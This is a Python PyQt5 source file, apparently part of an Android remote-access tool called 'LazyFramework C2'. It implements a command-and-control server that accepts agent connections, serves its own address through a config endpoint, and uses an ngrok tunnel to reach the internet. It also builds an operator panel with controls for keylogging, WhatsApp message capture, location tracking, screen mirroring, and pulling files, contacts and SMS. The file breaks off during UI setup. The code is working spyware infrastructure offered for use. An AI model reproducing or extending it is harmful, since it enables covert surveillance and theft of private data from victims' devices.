#!/usr/bin/env python3
"""
LazyFramework C2 - GUI Control Panel v3.3
Server & Client All-in-One - Langsung Terima Koneksi Agent
"""

import sys
import json
import socket
import threading
import time
import select
import subprocess
import requests
from datetime import datetime
from typing import Dict, Optional, List
from dataclasses import dataclass, asdict
from http.server import HTTPServer, BaseHTTPRequestHandler

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *

# ========================================
# DATA CLASSES
# ========================================

@dataclass
class Agent:
    id: str
    device: str = ""
    android: str = ""
    manufacturer: str = ""
    connected_at: str = ""
    last_seen: str = ""
    status: str = "online"
    mirroring: bool = False
    frame_count: int = 0
    commands_sent: int = 0
    conn: Optional[socket.socket] = None
    buffer: str = ""

# ========================================
# CONFIG SERVER UNTUK AGENT (PORT 8080)
# ========================================

class ConfigServer(QThread):
    log_message = pyqtSignal(str)
    
    def __init__(self, get_c2_url_callback):
        super().__init__()
        self.get_c2_url = get_c2_url_callback
        self.running = False
        self.httpd = None
        
    def run(self):
        class C2ConfigHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/api/c2":
                    try:
                        url = self.server.get_c2_url()
                        host = url.split(":")[0]
                        port = int(url.split(":")[1]) if ":" in url else 4444
                        
                        response = json.dumps({
                            "host": host,
                            "port": port,
                            "timestamp": int(time.time())
                        })
                        
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.send_header("Access-Control-Allow-Origin", "*")
                        self.end_headers()
                        self.wfile.write(response.encode())
                        print(f"📡 Config served: {host}:{port}")
                    except Exception as e:
                        self.send_response(500)
                        self.end_headers()
                        self.wfile.write(f'{{"error": "{str(e)}"}}'.encode())
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def log_message(self, format, *args):
                pass
            
            def do_OPTIONS(self):
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.send_header("Access-Control-Allow-Methods", "GET, OPTIONS")
                self.send_header("Access-Control-Allow-Headers", "Content-Type")
                self.end_headers()
        
        C2ConfigHandler.server = self
        
        try:
            self.httpd = HTTPServer(("0.0.0.0", 8080), C2ConfigHandler)
            self.httpd.get_c2_url = self.get_c2_url
            self.running = True
            self.log_message.emit("🌐 Config server running on port 8080")
            print("🌐 Config server running on port 8080")
            
            while self.running:
                self.httpd.handle_request()
        except Exception as e:
            self.log_message.emit(f"❌ Config server error: {e}")
            print(f"❌ Config server error: {e}")
    
    def stop(self):
        self.running = False
        if self.httpd:
            try:
                self.httpd.shutdown()
                self.httpd.server_close()
            except:
                pass
            self.httpd = None

# ========================================
# C2 SERVER - TERIMA KONEKSI AGENT LANGSUNG
# ========================================

class C2Server(QThread):
    server_started = pyqtSignal(str)
    server_stopped = pyqtSignal()
    server_error = pyqtSignal(str)
    agent_connected = pyqtSignal(dict)
    agent_disconnected = pyqtSignal(str)
    command_response = pyqtSignal(dict)
    keylog_data = pyqtSignal(dict)
    location_update = pyqtSignal(dict)
    whatsapp_message = pyqtSignal(dict)
    screen_frame = pyqtSignal(dict)
    log_message = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.socket: Optional[socket.socket] = None
        self.running = False
        self.port = 4444
        self.agents: Dict[str, Agent] = {}
        self.agent_lock = threading.Lock()
        self.buffer = ""
        self.local_ip = "localhost"
        self._update_local_ip()

    def _update_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
        except:
            self.local_ip = "localhost"

    def get_local_ip(self) -> str:
        self._update_local_ip()
        return self.local_ip

    def start_server(self, port: int = 4444):
        self.port = port
        self.running = True
        if not self.isRunning():
            self.start()
        else:
            self.stop_server()
            threading.Timer(0.5, self.start).start()

    def stop_server(self):
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

        with self.agent_lock:
            for agent_id, agent in list(self.agents.items()):
                if agent.conn:
                    try:
                        agent.conn.close()
                    except:
                        pass
                self.agents.pop(agent_id, None)
                self.agent_disconnected.emit(agent_id)

        self.server_stopped.emit()

    def send_command(self, agent_id: str, command: str, params: str = ""):
        with self.agent_lock:
            agent = self.agents.get(agent_id)
            if not agent or not agent.conn:
                self.log_message.emit(f"❌ Agent {agent_id[:12]}... not connected")
                return False

        try:
            full_cmd = f"{command} {params}".strip() if params else command
            msg = {
                "type": "command",
                "agent_id": agent_id,
                "command": full_cmd
            }
            data = json.dumps(msg) + "\n"
            agent.conn.send(data.encode())
            agent.commands_sent += 1
            self.log_message.emit(f"📤 {command} -> {agent_id[:12]}...")
            return True
        except Exception as e:
            self.log_message.emit(f"❌ Send failed: {e}")
            return False

    def run(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(("0.0.0.0", self.port))
            self.socket.listen(50)
            self.socket.setblocking(False)

            self.log_message.emit(f"🚀 Server started on port {self.port}")
            self.server_started.emit(f"http://localhost:{self.port}")

            inputs = [self.socket]

            while self.running:
                try:
                    readable, _, _ = select.select(inputs, [], [], 0.5)
                    for sock in readable:
                        if sock is self.socket:
                            try:
                                client_sock, addr = self.socket.accept()
                                client_sock.setblocking(False)
                                inputs.append(client_sock)
                                self.log_message.emit(f"📡 New connection from {addr[0]}:{addr[1]}")
                            except:
                                pass
                        else:
                            try:
                                data = sock.recv(65536)
                                if not data:
                                    self.remove_agent(sock)
                                    if sock in inputs:
                                        inputs.remove(sock)
                                    continue
                                self.process_agent_data(sock, data.decode())
                            except Exception as e:
                                self.log_message.emit(f"⚠️ Error reading from socket: {e}")
                                self.remove_agent(sock)
                                if sock in inputs:
                                    inputs.remove(sock)

                except Exception as e:
                    if self.running:
                        self.log_message.emit(f"⚠️ Server error: {e}")

        except Exception as e:
            self.server_error.emit(str(e))
        finally:
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass

    def process_agent_data(self, sock: socket.socket, data: str):
        """Process incoming data from agent - BYPASS BEACON"""
        self.log_message.emit(f"📥 Raw data ({len(data)} bytes)")
        
        agent_id = None
        
        with self.agent_lock:
            for aid, agent in self.agents.items():
                if agent.conn is sock:
                    agent_id = aid
                    break

        if not agent_id:
            try:
                lines = data.strip().split('\n')
                for line in lines:
                    if not line:
                        continue
                    try:
                        msg = json.loads(line)
                        self.handle_beacon(sock, msg)
                        return
                    except:
                        self.handle_raw_connection(sock, data)
                        return
            except:
                self.handle_raw_connection(sock, data)
            return

        with self.agent_lock:
            agent = self.agents.get(agent_id)
            if not agent:
                return
            agent.buffer += data
            agent.last_seen = datetime.now().isoformat()

        with self.agent_lock:
            agent = self.agents.get(agent_id)
            if not agent:
                return
            while "\n" in agent.buffer:
                line, agent.buffer = agent.buffer.split("\n", 1)
                line = line.strip()
                if not line:
                    continue
                self.handle_agent_message(agent, line)

    def handle_raw_connection(self, sock: socket.socket, data: str):
        """Handle raw connection tanpa beacon - TAHAN KONEKSI"""
        agent_id = f"agent_{int(time.time())}"
        
        self.log_message.emit(f"📥 Raw data from new connection: {data[:50]}...")
        
        device = "Raw Connection"
        try:
            if data and len(data) < 200:
                device = data.strip()[:50]
        except:
            pass
        
        with self.agent_lock:
            agent = Agent(
                id=agent_id,
                device=device,
                android="Unknown",
                manufacturer="Unknown",
                connected_at=datetime.now().isoformat(),
                last_seen=datetime.now().isoformat(),
                status="online",
                conn=sock
            )
            self.agents[agent_id] = agent
            
            agent_dict = {
                "id": agent.id,
                "device": agent.device,
                "android": agent.android,
                "manufacturer": agent.manufacturer,
                "connected_at": agent.connected_at,
                "last_seen": agent.last_seen,
                "status": agent.status,
                "mirroring": agent.mirroring,
                "frame_count": agent.frame_count,
                "commands_sent": agent.commands_sent
            }
            self.agent_connected.emit(agent_dict)
            
            self.log_message.emit(f"🟢 Raw agent connected: {agent_id[:12]}... ({device})")

        try:
            ack = json.dumps({"status": "connected", "agent_id": agent_id}) + "\n"
            sock.send(ack.encode())
            self.log_message.emit(f"📤 Acknowledgment sent to {agent_id[:12]}...")
        except Exception as e:
            self.log_message.emit(f"❌ Failed to send ack: {e}")

    def handle_beacon(self, sock: socket.socket, msg: dict):
        """Handle beacon - TERIMA SEMUA KONEKSI"""
        self.log_message.emit(f"📥 Beacon received")
        
        agent_id = msg.get("id", "")
        
        if not agent_id:
            try:
                addr = sock.getpeername()
                agent_id = f"agent_{addr[0]}_{addr[1]}"
            except:
                agent_id = f"agent_{int(time.time())}"
        
        device = msg.get("device", msg.get("model", msg.get("name", "Unknown Device")))
        android = msg.get("android", msg.get("version", "Unknown"))
        manufacturer = msg.get("manufacturer", msg.get("brand", "Unknown"))
        
        with self.agent_lock:
            if agent_id in self.agents:
                agent = self.agents[agent_id]
                if agent.conn:
                    try:
                        agent.conn.close()
                    except:
                        pass
                agent.conn = sock
                agent.last_seen = datetime.now().isoformat()
                agent.status = "online"
                if device and device != "Unknown Device":
                    agent.device = device
                if android and android != "Unknown":
                    agent.android = android
                if manufacturer and manufacturer != "Unknown":
                    agent.manufacturer = manufacturer
                
                agent_dict = {
                    "id": agent.id,
                    "device": agent.device,
                    "android": agent.android,
                    "manufacturer": agent.manufacturer,
                    "connected_at": agent.connected_at,
                    "last_seen": agent.last_seen,
                    "status": agent.status,
                    "mirroring": agent.mirroring,
                    "frame_count": agent.frame_count,
                    "commands_sent": agent.commands_sent
                }
                self.agent_connected.emit(agent_dict)
                self.log_message.emit(f"🔄 Agent reconnected: {agent_id[:12]}...")
                return

            agent = Agent(
                id=agent_id,
                device=device,
                android=android,
                manufacturer=manufacturer,
                connected_at=datetime.now().isoformat(),
                last_seen=datetime.now().isoformat(),
                status="online",
                conn=sock
            )
            self.agents[agent_id] = agent
            
            agent_dict = {
                "id": agent.id,
                "device": agent.device,
                "android": agent.android,
                "manufacturer": agent.manufacturer,
                "connected_at": agent.connected_at,
                "last_seen": agent.last_seen,
                "status": agent.status,
                "mirroring": agent.mirroring,
                "frame_count": agent.frame_count,
                "commands_sent": agent.commands_sent
            }
            self.agent_connected.emit(agent_dict)
            self.log_message.emit(f"🟢 Agent connected: {agent_id[:12]}... ({agent.device})")

        try:
            ack = json.dumps({"status": "connected", "agent_id": agent_id}) + "\n"
            sock.send(ack.encode())
            self.log_message.emit(f"📤 Acknowledgment sent to {agent_id[:12]}...")
        except Exception as e:
            self.log_message.emit(f"❌ Failed to send ack: {e}")

    def handle_agent_message(self, agent: Agent, line: str):
        try:
            msg = json.loads(line)
            msg_type = msg.get("type", "")

            if msg_type == "response":
                self.command_response.emit(msg)
            elif msg_type == "keylog":
                self.keylog_data.emit(msg)
            elif msg_type == "location_update":
                self.location_update.emit(msg)
            elif msg_type == "whatsapp_message":
                self.whatsapp_message.emit(msg)
            elif msg_type == "screen_frame":
                self.screen_frame.emit(msg)
            elif msg.get("command") or msg.get("result"):
                self.command_response.emit(msg)
            else:
                self.log_message.emit(f"📨 Unknown message: {line[:100]}...")

        except json.JSONDecodeError:
            if ":" in line and len(line) < 200:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    self.command_response.emit({
                        "type": "response",
                        "command": parts[0].strip(),
                        "result": parts[1].strip()
                    })
            else:
                self.log_message.emit(f"📨 Raw: {line[:100]}...")

    def remove_agent(self, sock: socket.socket):
        with self.agent_lock:
            for agent_id, agent in list(self.agents.items()):
                if agent.conn is sock:
                    agent.status = "offline"
                    self.agents.pop(agent_id, None)
                    self.agent_disconnected.emit(agent_id)
                    self.log_message.emit(f"🔴 Agent disconnected: {agent_id[:12]}...")
                    break

    def get_agents(self) -> List[dict]:
        with self.agent_lock:
            return [asdict(a) for a in self.agents.values()]

# ========================================
# NGROK HELPER
# ========================================

class NgrokHelper(QThread):
    tunnel_info = pyqtSignal(str, int)
    error = pyqtSignal(str)

    def __init__(self):
        super().__init__()
        self.running = False
        self.process = None

    def start_ngrok(self, port: int = 4444):
        self.port = port
        self.running = True
        self.start()

    def stop_ngrok(self):
        self.running = False
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=3)
            except:
                try:
                    self.process.kill()
                except:
                    pass
            self.process = None

    def run(self):
        try:
            try:
                subprocess.run(["ngrok", "--version"], capture_output=True, check=True)
            except:
                self.error.emit("Ngrok tidak terinstall. Install dengan: snap install ngrok")
                return

            self.process = subprocess.Popen(
                ["ngrok", "tcp", str(self.port)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            time.sleep(3)

            for _ in range(15):
                if not self.running:
                    break
                try:
                    response = requests.get("http://localhost:4040/api/tunnels", timeout=2)
                    if response.status_code == 200:
                        data = response.json()
                        for tunnel in data.get("tunnels", []):
                            if tunnel.get("proto") == "tcp":
                                url = tunnel.get("public_url", "").replace("tcp://", "")
                                if ":" in url:
                                    host, port_str = url.split(":", 1)
                                    self.tunnel_info.emit(host, int(port_str))
                                    return
                except:
                    pass
                time.sleep(1)

            self.error.emit("Gagal mendapatkan tunnel Ngrok")

        except Exception as e:
            self.error.emit(f"Ngrok error: {e}")
        finally:
            if self.process and self.running:
                try:
                    self.process.terminate()
                except:
                    pass

# ========================================
# AGENT WIDGET
# ========================================

class AgentWidget(QWidget):
    clicked = pyqtSignal(str)
    
    def __init__(self, agent: Agent, parent=None):
        super().__init__(parent)
        self.agent = agent
        self.setup_ui()
        
    def setup_ui(self):
        layout = QHBoxLayout(self)
        layout.setContentsMargins(8, 4, 8, 4)
        layout.setSpacing(8)
        
        self.status_dot = QLabel("●")
        self.status_dot.setStyleSheet("color: #51cf66; font-size: 14px;")
        layout.addWidget(self.status_dot)
        
        info_layout = QVBoxLayout()
        info_layout.setSpacing(0)
        
        name = QLabel(f"{self.agent.id[:12]}...")
        name.setStyleSheet("color: #c8d6e5; font-weight: 500; font-size: 13px;")
        info_layout.addWidget(name)
        
        device = QLabel(f"{self.agent.device or 'Unknown Device'}")
        device.setStyleSheet("color: #6b7a8a; font-size: 11px;")
        info_layout.addWidget(device)
        
        layout.addLayout(info_layout, 1)
        
        if self.agent.mirroring:
            mirror = QLabel("📸")
            mirror.setStyleSheet("color: #00d2ff;")
            layout.addWidget(mirror)
        
        self.setStyleSheet("""
            AgentWidget {
                background-color: transparent;
                border-radius: 6px;
                padding: 4px;
            }
            AgentWidget:hover {
                background-color: #111927;
            }
        """)
        
    def mousePressEvent(self, event):
        self.clicked.emit(self.agent.id)

# ========================================
# MAIN WINDOW
# ========================================

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.server = C2Server()
        self.ngrok = NgrokHelper()
        self.config_server = None
        self.selected_agent: Optional[str] = None
        self.agent_data: Dict[str, Agent] = {}
        self.stat_labels: Dict[str, QLabel] = {}
        self.agent_widgets: Dict[str, AgentWidget] = {}
        self.server_running = False
        self.ngrok_running = False
        self.ngrok_host = ""
        self.ngrok_port = 0
        
        self.setup_menu()
        self.setup_ui()
        self.setup_connections()

    def setup_menu(self):
        menubar = self.menuBar()
        
        file_menu = menubar.addMenu("Server")
        start_action = QAction("Start Server", self)
        start_action.triggered.connect(self.start_server)
        file_menu.addAction(start_action)
        
        stop_action = QAction("Stop Server", self)
        stop_action.triggered.connect(self.stop_server)
        file_menu.addAction(stop_action)
        
        file_menu.addSeparator()
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        ngrok_menu = menubar.addMenu("Ngrok")
        start_ngrok_action = QAction("Start Ngrok Tunnel", self)
        start_ngrok_action.triggered.connect(self.start_ngrok_tunnel)
        ngrok_menu.addAction(start_ngrok_action)
        
        stop_ngrok_action = QAction("Stop Ngrok Tunnel", self)
        stop_ngrok_action.triggered.connect(self.stop_ngrok_tunnel)
        ngrok_menu.addAction(stop_ngrok_action)
        
        help_menu = menubar.addMenu("Help")
        about_action = QAction("About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)

    def setup_ui(self):
        self.setWindowTitle("LazyFramework C2 - Server & Control")
        self.setGeometry(100, 100, 1400, 800)
        self.setStyleSheet(self.get_styles())

        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)

        top_bar = self.create_top_bar()
        main_layout.addWidget(top_bar)

        stats_row = self.create_stats_row()
        main_layout.addWidget(stats_row)

        splitter = QSplitter(Qt.Horizontal)

        agents_panel = self.create_agents_panel()
        splitter.addWidget(agents_panel)

        right_panel = self.create_right_panel()
        splitter.addWidget(right_panel)

        splitter.setSizes([320, 1080])
        main_layout.addWidget(splitter, 1)

        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("🔴 Server stopped - Click 'Start Server' to begin")

        self.ngrok_indicator = QLabel("🌐 Ngrok: Not started")
        self.ngrok_indicator.setStyleSheet("color: #6b7a8a;")
        self.status_bar.addPermanentWidget(self.ngrok_indicator)
        
        self.config_indicator = QLabel("📡 Config: Not started")
        self.config_indicator.setStyleSheet("color: #6b7a8a;")
        self.status_bar.addPermanentWidget(self.config_indicator)

    def get_styles(self):
        return """
            QMainWindow {
                background-color: #0a0e17;
                color: #c8d6e5;
            }
            QWidget {
                background-color: #0a0e17;
                color: #c8d6e5;
                font-family: 'Segoe UI', sans-serif;
            }
            QSplitter::handle {
                background-color: #1a2633;
                width: 2px;
            }
            QTextEdit {
                background-color: #0a0e17;
                border: 1px solid #1a2633;
                border-radius: 6px;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
            }
            QLineEdit {
                background-color: #0a0e17;
                border: 1px solid #1a2633;
                border-radius: 6px;
                padding: 8px 12px;
                color: #c8d6e5;
                font-size: 14px;
            }
            QLineEdit:focus {
                border-color: #00d2ff;
            }
            QPushButton {
                background-color: #111927;
                border: 1px solid #1a2633;
                border-radius: 6px;
                padding: 8px 16px;
                color: #c8d6e5;
                font-size: 13px;
                font-weight: 500;
            }
            QPushButton:hover {
                background-color: #1a2633;
                border-color: #00d2ff;
            }
            QPushButton.primary {
                background-color: #00d2ff;
                color: #0a0e17;
                border-color: #00d2ff;
            }
            QPushButton.primary:hover {
                background-color: #00b8e6;
            }
            QPushButton.danger {
                border-color: #ff6b6b;
                color: #ff6b6b;
            }
            QPushButton.danger:hover {
                background-color: #ff6b6b;
                color: #0a0e17;
            }
            QPushButton.success {
                border-color: #51cf66;
                color: #51cf66;
            }
            QPushButton.success:hover {
                background-color: #51cf66;
                color: #0a0e17;
            }
            QTabWidget::pane {
                background-color: #0d1520;
                border: 1px solid #1a2633;
                border-radius: 6px;
            }
            QTabBar::tab {
                background-color: #0a0e17;
                padding: 8px 16px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
                border: 1px solid #1a2633;
                border-bottom: none;
            }
            QTabBar::tab:selected {
                background-color: #111927;
                color: #00d2ff;
                border-bottom: 2px solid #00d2ff;
            }
            QTabBar::tab:hover {
                background-color: #111927;
            }
            QLabel {
                color: #c8d6e5;
            }
            QScrollBar:vertical {
                background-color: #0a0e17;
                width: 8px;
                border-radius: 4px;
            }
            QScrollBar::handle:vertical {
                background-color: #1a2633;
                border-radius: 4px;
                min-height: 20px;
            }
            QScrollBar::handle:vertical:hover {
                background-color: #2a3a4a;
            }
            QStatusBar {
                background-color: #0d1520;
                color: #6b7a8a;
            }
            QMenuBar {
                background-color: #0d1520;
                color: #c8d6e5;
                border-bottom: 1px solid #1a2633;
            }
            QMenuBar::item:selected {
                background-color: #1a2633;
            }
            QMenu {
                background-color: #0d1520;
                border: 1px solid #1a2633;
            }
            QMenu::item:selected {
                background-color: #1a2633;
            }
            QScrollArea {
                border: none;
                background-color: transparent;
            }
            QScrollArea > QWidget > QWidget {
                background-color: transparent;
            }
        """

    def create_top_bar(self):
        widget = QWidget()
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)

        title = QLabel("⚡ LazyFramework C2")
        title.setStyleSheet("font-size: 24px; font-weight: 700; color: #00d2ff;")
        layout.addWidget(title)

        layout.addStretch()

        self.status_dot = QLabel("●")
        self.status_dot.setStyleSheet("color: #ff6b6b; font-size: 18px;")
        self.status_label = QLabel("Stopped")
        self.status_label.setStyleSheet("color: #6b7a8a; font-size: 14px;")
        layout.addWidget(self.status_dot)
        layout.addWidget(self.status_label)

        self.port_label = QLabel("Port: 4444")
        self.port_label.setStyleSheet("color: #6b7a8a; font-size: 13px; padding: 4px 12px; background: #0d1520; border-radius: 4px;")
        layout.addWidget(self.port_label)

        self.host_label = QLabel("🌐 localhost:4444")
        self.host_label.setStyleSheet("color: #6b7a8a; font-size: 13px; padding: 4px 12px; background: #0d1520; border-radius: 4px;")
        layout.addWidget(self.host_label)

        self.start_btn = QPushButton("▶️ Start Server")
        self.start_btn.setProperty("class", "primary")
        self.start_btn.clicked.connect(self.start_server)
        layout.addWidget(self.start_btn)

        self.ngrok_btn = QPushButton("🌐 Ngrok")
        self.ngrok_btn.setStyleSheet("""
            QPushButton {
                background-color: #0d1520;
                border: 1px solid #ffd93d;
                border-radius: 6px;
                padding: 8px 16px;
                color: #ffd93d;
                font-size: 13px;
                font-weight: 500;
            }
            QPushButton:hover {
                background-color: #1a2633;
                border-color: #ffd93d;
            }
        """)
        self.ngrok_btn.clicked.connect(self.start_ngrok_tunnel)
        layout.addWidget(self.ngrok_btn)

        refresh_btn = QPushButton("🔄")
        refresh_btn.setFixedSize(36, 36)
        refresh_btn.setToolTip("Refresh Agents")
        refresh_btn.clicked.connect(self.refresh_agents)
        layout.addWidget(refresh_btn)

        return widget

    def create_stats_row(self):
        widget = QWidget()
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(10)

        stats = [
            ("Agents", "📱 Agents", "0", "#00d2ff"),
            ("Online", "🟢 Online", "0", "#51cf66"),
            ("Mirror", "📸 Mirror", "0", "#ffd93d"),
            ("Commands", "⚡ Commands", "0", "#cc5de8"),
        ]

        for key, label, value, color in stats:
            container = QWidget()
            container.setStyleSheet(f"""
                background-color: #0d1520;
                border: 1px solid #1a2633;
                border-radius: 6px;
                padding: 8px 16px;
            """)
            inner = QHBoxLayout(container)
            inner.setContentsMargins(0, 0, 0, 0)

            label_widget = QLabel(label)
            label_widget.setStyleSheet("color: #6b7a8a; font-size: 11px;")
            value_widget = QLabel(value)
            value_widget.setStyleSheet(f"""
                color: {color};
                font-size: 22px;
                font-weight: 700;
            """)
            value_widget.setObjectName(f"stat_{key}")

            self.stat_labels[key] = value_widget

            inner.addWidget(label_widget)
            inner.addStretch()
            inner.addWidget(value_widget)
            layout.addWidget(container)

        return widget

    def create_agents_panel(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)

        header = QWidget()
        header_layout = QHBoxLayout(header)
        header_layout.setContentsMargins(0, 0, 0, 0)
        
        title = QLabel("📱 Agents")
        title.setStyleSheet("font-size: 14px; font-weight: 600; color: #6b7a8a;")
        self.agent_count_label = QLabel("0")
        self.agent_count_label.setStyleSheet("color: #6b7a8a; font-size: 12px; background: #0a0e17; padding: 2px 10px; border-radius: 10px;")
        
        header_layout.addWidget(title)
        header_layout.addStretch()
        header_layout.addWidget(self.agent_count_label)
        layout.addWidget(header)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("""
            QScrollArea {
                border: 1px solid #1a2633;
                border-radius: 6px;
                background-color: #0d1520;
            }
        """)
        
        self.agent_container = QWidget()
        self.agent_layout = QVBoxLayout(self.agent_container)
        self.agent_layout.setContentsMargins(4, 4, 4, 4)
        self.agent_layout.setSpacing(2)
        self.agent_layout.addStretch()
        
        scroll.setWidget(self.agent_container)
        layout.addWidget(scroll, 1)

        controls = QWidget()
        controls_layout = QHBoxLayout(controls)
        controls_layout.setContentsMargins(0, 4, 0, 0)

        select_all_btn = QPushButton("Select All")
        select_all_btn.setStyleSheet("font-size: 11px; padding: 4px 12px;")
        select_all_btn.clicked.connect(self.select_all_agents)
        controls_layout.addWidget(select_all_btn)

        deselect_all_btn = QPushButton("Deselect")
        deselect_all_btn.setStyleSheet("font-size: 11px; padding: 4px 12px;")
        deselect_all_btn.clicked.connect(self.deselect_all_agents)
        controls_layout.addWidget(deselect_all_btn)

        controls_layout.addStretch()
        layout.addWidget(controls)

        return widget

    def create_right_panel(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(0, 0, 0, 0)

        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("""
            QTabWidget::pane {
                background-color: #0d1520;
                border: 1px solid #1a2633;
                border-radius: 6px;
            }
            QTabBar::tab {
                background-color: #0a0e17;
                padding: 6px 14px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
                border: 1px solid #1a2633;
                border-bottom: none;
            }
            QTabBar::tab:selected {
                background-color: #111927;
                color: #00d2ff;
                border-bottom: 2px solid #00d2ff;
            }
            QTabBar::tab:hover {
                background-color: #111927;
            }
        """)

        # Output Tab
        self.output_tab = QWidget()
        output_layout = QVBoxLayout(self.output_tab)
        output_layout.setContentsMargins(0, 0, 0, 0)
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0e17;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
                min-height: 300px;
            }
        """)
        output_layout.addWidget(self.output_text)
        self.tabs.addTab(self.output_tab, "📄 Output")

        # Keylog Tab
        self.keylog_tab = QWidget()
        keylog_layout = QVBoxLayout(self.keylog_tab)
        self.keylog_text = QTextEdit()
        self.keylog_text.setReadOnly(True)
        self.keylog_text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0e17;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
                min-height: 300px;
            }
        """)
        keylog_layout.addWidget(self.keylog_text)
        
        keylog_controls = QWidget()
        kl_layout = QHBoxLayout(keylog_controls)
        kl_layout.setContentsMargins(0, 4, 0, 0)
        for text, cmd in [
            ("▶️ Start", "KEYLOG_START"),
            ("⏹️ Stop", "KEYLOG_STOP"),
            ("📄 Dump", "KEYLOG_DUMP"),
            ("🗑️ Clear", "clear")
        ]:
            btn = QPushButton(text)
            btn.setStyleSheet("font-size: 11px; padding: 4px 12px;")
            if "Start" in text:
                btn.setProperty("class", "success")
            elif "Stop" in text:
                btn.setProperty("class", "danger")
            btn.clicked.connect(lambda checked, c=cmd: self.on_keylog_action(c))
            kl_layout.addWidget(btn)
        kl_layout.addStretch()
        keylog_layout.addWidget(keylog_controls)
        self.tabs.addTab(self.keylog_tab, "⌨️ Keylog")

        # WhatsApp Tab
        self.whatsapp_tab = QWidget()
        wa_layout = QVBoxLayout(self.whatsapp_tab)
        self.wa_text = QTextEdit()
        self.wa_text.setReadOnly(True)
        self.wa_text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0e17;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
                min-height: 300px;
            }
        """)
        wa_layout.addWidget(self.wa_text)
        
        wa_controls = QWidget()
        wa_btn_layout = QHBoxLayout(wa_controls)
        wa_btn_layout.setContentsMargins(0, 4, 0, 0)
        for text, cmd in [
            ("💬 Start", "WA_CAPTURE_START"),
            ("⏹️ Stop", "WA_CAPTURE_STOP"),
            ("📄 Dump", "WA_CAPTURE_DUMP"),
            ("🗑️ Clear", "clear_wa")
        ]:
            btn = QPushButton(text)
            btn.setStyleSheet("font-size: 11px; padding: 4px 12px;")
            if "Start" in text:
                btn.setProperty("class", "success")
            elif "Stop" in text:
                btn.setProperty("class", "danger")
            btn.clicked.connect(lambda checked, c=cmd: self.on_whatsapp_action(c))
            wa_btn_layout.addWidget(btn)
        wa_btn_layout.addStretch()
        wa_layout.addWidget(wa_controls)
        self.tabs.addTab(self.whatsapp_tab, "💬 WhatsApp")

        # Location Tab
        self.location_tab = QWidget()
        location_layout = QVBoxLayout(self.location_tab)
        self.location_text = QTextEdit()
        self.location_text.setReadOnly(True)
        self.location_text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0e17;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
                min-height: 300px;
            }
        """)
        location_layout.addWidget(self.location_text)
        self.tabs.addTab(self.location_tab, "📍 Location")

        # Screenshot Tab
        self.screenshot_tab = QWidget()
        screenshot_layout = QVBoxLayout(self.screenshot_tab)
        self.screenshot_text = QTextEdit()
        self.screenshot_text.setReadOnly(True)
        self.screenshot_text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0e17;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
                min-height: 300px;
            }
        """)
        screenshot_layout.addWidget(self.screenshot_text)
        self.tabs.addTab(self.screenshot_tab, "📸 Screenshot")

        # Live Mirror Tab
        self.mirror_tab = QWidget()
        mirror_layout = QVBoxLayout(self.mirror_tab)
        self.mirror_text = QTextEdit()
        self.mirror_text.setReadOnly(True)
        self.mirror_text.setStyleSheet("""
            QTextEdit {
                background-color: #0a0e17;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                padding: 8px;
                min-height: 300px;
            }
        """)
        mirror_layout.addWidget(self.mirror_text)
        self.tabs.addTab(self.mirror_tab, "📺 Live Mirror")

        # More tabs...
        self.tabs.addTab(self.create_simple_tab("📁 Files", "GET_FILES_LIST"), "📁 Files")
        self.tabs.addTab(self.create_simple_tab("👤 Contacts", "GET_CONTACTS"), "👤 Contacts")
        self.tabs.addTab(self.create_simple_tab("📨 SMS", "GET_SMS"), "📨 SMS")
